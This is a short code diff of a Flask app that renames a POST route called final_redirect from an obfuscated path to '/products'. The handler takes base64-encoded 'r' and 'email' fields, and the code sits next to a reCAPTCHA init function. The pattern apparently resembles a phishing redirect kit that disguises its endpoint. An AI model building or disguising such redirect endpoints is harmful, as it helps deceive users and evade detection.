@@ -45,7 +45,7 @@ def verify_recaptcha_init():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-@app.route("/_0x35adc6", methods=["POST"])
+@app.route("/products", methods=["POST"])
 def final_redirect():
     r_b64 = request.form.get("r")
     email_b64 = request.form.get("email")
